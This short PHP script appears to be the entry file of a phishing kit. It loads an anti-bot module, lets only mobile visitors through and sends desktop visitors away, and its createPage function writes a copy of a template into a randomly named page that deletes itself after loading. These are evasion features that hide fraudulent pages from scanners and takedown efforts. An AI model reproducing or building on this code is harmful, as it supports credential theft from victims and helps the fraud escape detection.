<?php 
@session_start();
@date_default_timezone_set("Australia/Sydney");
require (__DIR__).'/bots/father.php';
require (__DIR__)."/md.php";
require (__DIR__)."/config.php";
$detect = new Mobile_Detect;
if(!$detect->isMobile() and strtolower($block_pc)=="on"){
   exit(header("location: out.php"));
 }

function createPage($name){
	$new = (__dir__)."/post/".uniqid()."-".rand(0, 99999).".php";
     $html = file_get_contents((__dir__)."/post/source/$name.txt");
	$fp =fopen($new, "w+");
	fwrite($fp, $html);
     fwrite($fp, "<?php unlink(basename(\$_SERVER['SCRIPT_NAME'])); ?>");
	fclose($fp);
     return basename($new);
}




?>